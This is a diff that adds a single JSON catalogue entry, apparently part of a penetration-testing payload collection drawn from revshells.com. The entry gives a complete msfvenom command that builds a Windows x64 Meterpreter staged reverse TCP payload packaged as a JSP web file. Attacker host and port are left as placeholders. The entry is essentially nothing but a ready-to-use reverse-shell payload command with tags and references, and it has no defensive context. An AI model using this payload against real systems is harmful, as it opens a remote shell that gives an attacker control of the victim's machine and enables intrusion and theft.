@@ -1,0 +1,31 @@
+{
+  "id": "rsg-msfvenom-windows-staged-jsp-reverse-tcp",
+  "name": "RSG · MSFVenom · Windows Staged JSP Reverse TCP",
+  "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f jsp -o ./rev.jsp",
+  "description": "M S F Venom payload — Windows Staged JSP Reverse TCP (via reverse-shell-generator).",
+  "platform": "windows",
+  "tags": [
+    "rsg",
+    "payload",
+    "msfvenom",
+    "msfvenom",
+    "windows",
+    "staged",
+    "reverse"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "MSFVenom/Windows Staged JSP Reverse TCP/87",
+  "category": "payloads",
+  "subcategory": "msfvenom",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
